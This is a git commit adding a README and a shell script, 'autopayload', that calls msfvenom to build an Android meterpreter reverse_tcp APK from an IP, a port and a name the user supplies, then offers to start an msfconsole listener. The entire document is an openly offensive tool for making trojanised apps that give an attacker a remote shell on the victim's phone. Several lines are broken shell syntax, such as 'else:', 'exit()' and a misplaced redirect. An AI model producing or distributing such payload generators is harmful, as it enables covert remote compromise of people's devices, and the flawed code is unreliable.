a8dca7a47f1aae595f1361757463feb50d04ff5e
Z3r0 <67552744+Z3r0-404@users.noreply.github.com>
2020-08-03 11:01:09 +0100

    Add files via upload

--- README.md
+++ README.md
@@ -1,1 +1,29 @@
-# autopayload
+#Autor, Abbah - StarFord, Z3r0
+# Tool Name  Payload Generator for termux and kali linux,
+#my git repo https://github.com/Z3r0-404
+#NOTE THIS tool requires METASPLOIT FRAMEWORK INSTALLED !!.
+
+feel free to edit the script,
+
+tools usage
+
+
+
+git clone https://github.com/Z3r0-404/autopayload
+
+cd autopayload
+
+chmod +x autopayload.sh
+
+bash autopayload.sh
+
+
+
+
+#thanks to allah swa
+#thanks to my phone and my internet,
+
+contact me @ FACEBOOK    Abbah Isah   or     Star Ford
+contact @ Instagram        Abbah_0x2
+
+clntact me for any error
---
+++ autopayload.sh
@@ -0,0 +1,46 @@
+#!/system/bin/sh
+clear
+echo "################№#################"
+echo "#  SCRIPT FOR LAUNCHUNG MSFVENOM #"
+echo "#    auto create payload         #"
+echo -e "#\e[1;31m @autor [*] ABBAH ISAH\e[0m   #"
+echo "# github = github.com/Z3r0-404   #"
+echo "#########################№#№##№##№"
+echo ""
+echo -e "\e[1;31m LaUnchInG msfvenom.............\e[0m"
+echo ""
+echo -e "\e[1;33m ENTER YOUR IP ADDRESS $:\e[0m"
+read IP
+
+     echo -e "\e[1;33m ENTER YOUR PORT NUMBER E.G (80)$:\e[0m"
+read PORT
+
+     echo -e "\e[1;33m what name do you want for the payload app ?$:\e[0m"
+read pay
+echo ""
+  echo -e "\e[1;34m pls wait while the script  creates  a payload \e[0m"
+    echo ""
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT >R -o /root/$pay.apk
+  echo ""
+echo "Payload succesfully created [ located at system home directory"
+     echo "========================================================="
+echo ""
+echo " payload saved as $pay.apk"
+echo ""
+echo -e " \e[1;33mDo you want to start MSFCONSOLE listener ?? :\e[0m"
+echo " launching Listeners ....."
+echo "       yes or no ?   "
+
+yes=$(msfconsole)
+read $yes
+if [[ $yes == msfconsole ]]; then
+    echo "lets run listeners"
+    echo msfconsole
+else:
+   exit()
+fi
+
+#my git ripo https://github.com/Z3r0-404
+#facebook    Abbah Isah
+#insagram    Abba_0x2
+#thanks to ALLAH SWA
